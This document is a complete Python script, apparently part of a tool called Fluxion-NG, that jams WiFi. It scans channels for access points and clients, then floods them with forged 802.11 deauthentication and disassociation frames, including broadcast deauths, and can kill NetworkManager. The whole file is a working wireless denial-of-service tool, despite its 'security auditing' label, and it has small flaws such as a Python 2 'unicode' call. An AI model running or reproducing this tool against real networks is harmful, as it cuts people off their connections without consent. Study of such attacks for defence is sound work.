#!/usr/bin/env python3
# -*- coding: UTF-8 -*-

import re
import os
import sys
import time
import logging
import argparse
import subprocess

from scapy.all import (
    Dot11, Dot11Deauth, Dot11Disas, RadioTap,
    sendp, send, sniff, conf, Dot11Beacon, Dot11ProbeResp,
    Dot11AssoReq, Dot11AssoResp, Dot11Auth, Dot11Elt
)

import pyric.pyw as pyw

from threading import Thread, Lock
from signal import SIGINT, SIGTERM, signal

conf.verb = 0 # Silences scapy

# Console Colors
W  = '\033[0m\033[1m'  # white (normal)
R  = '\033[1m\033[31m' # red
G  = '\033[1m\033[32m' # green
O  = '\033[1m\033[33m' # orange
B  = '\033[1m\033[34m' # blue
P  = '\033[1m\033[35m' # purple
C  = '\033[1m\033[36m' # cyan
GR = '\033[1m\033[37m' # gray
T  = '\033[1m\033[93m' # tan

VALID_CHANNELS_2GHZ = list(range(1, 15))  # Channels 1-14
VALID_CHANNELS_5GHZ = [
    36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108,
    112, 116, 132, 136, 140, 149, 153, 157, 161, 165]
ALL_VALID_CHANNELS = VALID_CHANNELS_2GHZ + VALID_CHANNELS_5GHZ

# Legacy alias
five_hertz = VALID_CHANNELS_5GHZ

# devnull = open(os.devnull, 'w')
threadLock = Lock()

class wifijammer:

    def __init__(self, args):
        self.mPackets = 0

        self.clients = []
        self.APs     = []

        self.firstPass = True

        self.mIgnoreList = [
            'ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:00:', '33:33:ff:',
            '01:80:c2:00:00:00', '01:00:5e:', '01:00:0c'] + \
            [pyw.macget(pyw.getcard(x)) for x in pyw.winterfaces()] + \
            [x for x in args['skip'] if re.match("[0-9a-f]{2}([-:])[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", x.lower())]

        # Args
        self.mInterface = args["interface"]
        self.mFrequency = args["frequency"]
        self.mChannels  = args["channel"]
        self.mKill      = args["kill"]
        self.mDirected  = args["directed"]
        self.mTargets   = [x for x in args['targets'] if re.match("[0-9a-f]{2}([-:])[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", x.lower())]
        self.mMaximum   = int(args["maximum"])
        self.mPackets   = int(args["pkts"])
        self.mTimeout   = float(args["timeout"])
        self.mChannel   = pyw.chget(pyw.getcard(self.mInterface))
        self.mDetailed  = args['details']
        self.mLoglevel  = args['loglevel']
        self.mSSID      = args['ssid']

        LogLevels={'info': logging.INFO, 'error': logging.ERROR, 'debug': logging.DEBUG, 'critical': logging.CRITICAL}
        logging.basicConfig(
            level=LogLevels[self.mLoglevel],
            format='%(asctime)s %(name)-12s %(levelname)-8s %(message)s',
            datefmt='%Y/%m/%d %H:%M:%S')

        if self.mFrequency == "2":
            self.mChannels = [int(x) for x in self.mChannels if int(x) in VALID_CHANNELS_2GHZ]

            if self.mChannels == []:
                self.mChannels = list(VALID_CHANNELS_2GHZ)

        elif self.mFrequency == "5":
            self.mChannels = [int(x) for x in self.mChannels if int(x) in VALID_CHANNELS_5GHZ]

            if self.mChannels == []:
                self.mChannels = list(VALID_CHANNELS_5GHZ)

        else:
            self.mChannels = [int(x) for x in self.mChannels if int(x) in ALL_VALID_CHANNELS]

            if self.mChannels == []:
                self.mChannels = list(ALL_VALID_CHANNELS)

        if pyw.modeget(self.mInterface) != 'monitor':
            logging.debug('Enabling monitor mode on interface '+self.mInterface)
            start_mon_mode(self.mInterface)

        if self.mKill:
            subprocess.call(['pkill', 'NetworkManager'])

        conf.iface = self.mInterface

        return

    def jam(self):
        self.hop = Thread(target=self.channel_hop)
        self.hop.daemon = True
        self.hop.start()

        signal(SIGINT, stop)
        signal(SIGTERM, stop)

        filter_string = ""

        if len(self.mTargets) > 1:
            filter_string = "ether host "+self.mTargets[0]
            for client in self.mTargets[1:]:
                filter_string += " or ether host " + client

        elif len(self.mTargets) == 1:
            filter_string = "ether host " + self.mTargets[0].lower()


        sniff(iface=self.mInterface, filter=filter_string, store=0, prn=self.cb)

    def channel_hop(self):
        interface = pyw.getcard(self.mInterface)
        channelCounter = 0

        while 1:
            if len(self.mChannels) == 1:
                with threadLock:
                    self.mChannel = self.mChannels[0]
                    try:
                        pyw.chset(interface, int(self.mChannel), None)
                    except Exception:
                        sys.stderr.write("Channel Hopping Failed")
            else:

                with threadLock:
                    self.mChannel = str(self.mChannels[channelCounter])

                channelCounter +=1

                if channelCounter == len(self.mChannels):
                    channelCounter = 0
                    with threadLock:
                        self.firstPass = False

                try:
                    pyw.chset(interface, int(self.mChannel), None)
                except Exception:
                    sys.stderr.write("Channel Hopping Failed")

            self.output()

            if len(self.mChannels) == 1:
                time.sleep(.1)

            else:
                if self.firstPass == 1:
                    time.sleep(3.5)
                    continue

            self.deauth()

    def output(self):
        if self.mLoglevel != 'debug':
            print('\033[2J\033[H', end='', flush=True)

        print(
            "[{0}+{1}] {2} channel {0}{3}{1}".format(
                G,
                W,
                self.mInterface,
                str(self.mChannel)
            )
        )

        if self.mDetailed:
            with threadLock:
                print('\n                  Deauthing                 ch   ESSID')
                for ca in self.clients:
                    if len(ca) > 3:
                        print(
                            "[{0}*{1}] {2}{3}{1} - {2}{4}{1} - {5} - {0}{6}{1}".format(
                                C,
                                W,
                                P,
                                ca[0],
                                ca[1],
                                str(ca[2]).ljust(4),
                                ca[3]
                                )
                            )
                    else:
                        print(
                            "[{0}*{1}] {2}{3}{1} - {2}{4}{1} - {5}".format(
                                C,
                                W,
                                P,
                                ca[0],
                                ca[1],
                                str(ca[2]).ljust(4)
                            )
                        )


        with threadLock:
            print('\n      Access Points     ch     ESSID')
            for ap in self.APs:
                print(
                    "[{0}*{1}] {2}{3}{1}    - {4} - {0}{5}{1} - {2}{6}{1}".format(
                        C,
                        W,
                        P,
                        ap[0],
                        str(ap[1]).ljust(5),
                        ap[2][:22].ljust(25),
                        str(len([x[0] for x in self.clients if x[0].lower() == ap[0].lower()]))
                        )
                    )
        return

    def deauth(self):
        pkts = []
        # print(len(self.clients), len(self.APs))

        if len(self.clients) > 0:
            with threadLock:
                for x in self.clients:
                    client = x[0]
                    ap = x[1]
                    ch = x[2]
                    # print(str(ch)+":"+str(self.mChannel))
                    if int(ch) == int(self.mChannel):
                        deauth_pkt1 = Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
                        deauth_pkt2 = Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Deauth()
                        disas_pkt1 = Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Disas()
                        disas_pkt2 = Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Disas()
                        pkts.append(deauth_pkt1)
                        pkts.append(deauth_pkt2)

                        pkts.append(disas_pkt1)
                        pkts.append(disas_pkt2)

        if len(self.APs) > 0:
            if not self.mDirected:
                with threadLock:
                    for a in self.APs:
                        ap = a[0]
                        ch = a[1]
                        # print(str(ch)+":"+str(self.mChannel))
                        if int(ch) == int(self.mChannel):
                            deauth_ap = Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=ap, addr3=ap)/Dot11Deauth()
                            pkts.append(deauth_ap)

        if len(pkts) > 0:
            for p in pkts:
                # print("Deauth")
                send(p, inter=float(self.mTimeout), count=self.mPackets)

    def noise_filter(self, addr1, addr2):
        if len([y for y in self.mIgnoreList if addr1.startswith(y) or addr2.startswith(y)]) > 0:
            return True
        return False

    def cb(self, pkt):
        if pkt.haslayer(Dot11):
            if pkt.addr1 and pkt.addr2:
                pkt.addr1 = pkt.addr1.lower()
                pkt.addr2 = pkt.addr2.lower()

                if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                    self.APs_add(pkt)

                # Ignore all the noisy packets like spanning tree

                if self.noise_filter(pkt.addr1, pkt.addr2):
                    return

                # Management = 1, data = 2
                if pkt.type in [1, 2]:
                    self.clients_add(pkt.addr1, pkt.addr2)
        return

    def APs_add(self, pkt):
        ssid       = get_ssid(pkt[Dot11Elt].info)
        bssid      = pkt.addr3.lower()

        try:
            # Thanks to airoscapy for below
            if int(self.mChannel) < 14:
                ap_channel = str(ord(pkt[Dot11Elt:3].info))
            else:
                dot11elt = pkt.getlayer(Dot11Elt, ID=61)


                ap_channel = ord(dot11elt.info[-int(dot11elt.len):-int(dot11elt.len)+1])
        except Exception:
            ap_channel = self.mChannel

            # print(ap_channel, self.mChannels, self.mChannel, ap_channel)

        if int(ap_channel) not in self.mChannels:
            return

        if self.mSSID and ssid != self.mSSID:
            return

        # except Exception as e:
        #     return

        for ap in self.APs:
            if bssid == ap[0]:
                return

        with threadLock:
            return self.APs.append([bssid, ap_channel, ssid])

    def clients_add(self, addr1, addr2):
        if len(self.clients) == 0:
            if len(self.APs) == 0:
                with threadLock:
                    return self.clients.append([addr1, addr2, self.mChannel])
            else:
                self.AP_check(addr1, addr2)

        # Append new clients/APs if they're not in the list
        else:
            for ca in self.clients:
                if addr1 in ca and addr2 in ca:
                    return

            if len(self.APs) > 0:
                return self.AP_check(addr1, addr2)
            else:
                with threadLock:
                    return self.clients.append([addr1, addr2, self.mChannel])

    def AP_check(self, addr1, addr2):
        for ap in self.APs:
            if ap[0].lower() in addr1.lower() or ap[0].lower() in addr2.lower():
                with threadLock:
                    return self.clients.append([addr1, addr2, ap[1], ap[2]])

def stop(signum=None, frame=None):
    """Handle SIGINT/SIGTERM for clean exit."""
    sig_name = 'UNKNOWN'
    if signum is not None:
        sig_name = {2: 'SIGINT', 15: 'SIGTERM'}.get(signum, str(signum))
    print('\r['+R+'!'+W+'] Closing (received {})'.format(sig_name))
    sys.exit(0)

def validate_mac(mac):
    """Validate a MAC address format (XX:XX:XX:XX:XX:XX or XX-XX-XX-XX-XX-XX)."""
    if not re.match(r'^([0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2}$', mac):
        raise argparse.ArgumentTypeError(
            "Invalid MAC address: '{}'. Expected format: XX:XX:XX:XX:XX:XX".format(mac))
    return mac.lower()


def validate_channel(ch):
    """Validate a WiFi channel number (2.4GHz: 1-14, 5GHz: 36-165)."""
    try:
        ch_int = int(ch)
    except ValueError:
        raise argparse.ArgumentTypeError(
            "Invalid channel: '{}'. Must be an integer.".format(ch))
    if ch_int not in ALL_VALID_CHANNELS:
        raise argparse.ArgumentTypeError(
            "Invalid channel: {}. Valid 2.4GHz: 1-14, Valid 5GHz: {}".format(
                ch, VALID_CHANNELS_5GHZ))
    return ch


def parse_args():
    parser = argparse.ArgumentParser(
        description="Fluxion-NG WiFi deauthentication module for security auditing",
        formatter_class=argparse.RawDescriptionHelpFormatter)

    parser.add_argument("-i", "--interface",
        action="store",
        dest="interface",
        help="Wireless interface to use for deauthentication (must support monitor mode)",
        choices=[x for x in pyw.winterfaces()],
        required=True)

    parser.add_argument("-f", "--frequency",
        action="store",
        default="2",
        dest="frequency",
        help="Frequency band to operate on: '2' for 2.4GHz, '5' for 5GHz, 'all' for both (default: 2)",
        choices=["2", "5", "all"])

    parser.add_argument("-c", "--channel",
        action="store",
        default=[],
        dest="channel",
        nargs="*",
        type=validate_channel,
        help="WiFi channel(s) to operate on (2.4GHz: 1-14, 5GHz: 36-165). Omit for all channels.")

    parser.add_argument("-k", "--kill",
        action="store_true",
        dest="kill",
        help="Kill interfering processes (e.g., NetworkManager) before starting")

    parser.add_argument("-m", "--maximum",
        default=9999,
        dest="maximum",
        type=int,
        help="Maximum number of tracked clients before the list resets (default: 9999)")

    parser.add_argument("-t", "--timeinterval",
        dest="timeout",
        default=0.001,
        type=float,
        help="Time interval in seconds between deauth packets (default: 0.001)")

    parser.add_argument("-p", "--pkts",
        default=5,
        dest="pkts",
        type=int,
        help="Number of deauth packets per burst (default: 5)")

    parser.add_argument("-d", "--directedonly",
        default=False,
        dest="directed",
        action='store_true',
        help="Only send directed (client-specific) deauths, skip broadcast deauths")

    parser.add_argument("-a", "--accesspoint",
        nargs='*',
        default=[],
        dest="targets",
        type=validate_mac,
        help="MAC address(es) of target access point(s) (format: XX:XX:XX:XX:XX:XX)")

    parser.add_argument("-s", "--skip",
        nargs='*',
        default=[],
        dest="skip",
        help="MAC address(es) to exclude from deauthentication")

    parser.add_argument("-D", "--details",
        default=False,
        dest="details",
        action='store_true',
        help="Show detailed output including per-client deauth status")

    parser.add_argument("-l", "--loglevel",
        default='info',
        dest="loglevel",
        choices=['debug', 'info', 'error', 'critical'],
        help="Logging verbosity level (default: info)")

    parser.add_argument("-S", "--ssid",
        dest='ssid',
        help="Only target access points matching this SSID name"
    )

    return vars(parser.parse_args())

def get_ssid(p):
    if p and u"\x00" not in "".join([x if ord(x) < 128 else "" for x in p]):

        try:
            name = p.decode("utf-8")        # Remove assholes emojis in SSID's
        except Exception:
            name = unicode(p, errors='ignore')

    else:
        name = (("< len: {0} >").format(len(p)))

    return name

def start_mon_mode(interface):
    print ('Starting monitor mode off')
    try:
        subprocess.call(['ip', 'link', 'set', interface, 'down'])
        subprocess.call(['iwconfig', interface, 'mode', 'monitor'])
        subprocess.call(['ip', 'link', 'set', interface, 'up'])
        return interface
    except Exception:
        sys.exit('Could not start monitor mode')

def main():
    jammer = wifijammer(parse_args())
    jammer.jam()
    return

if __name__ == "__main__":
    main()
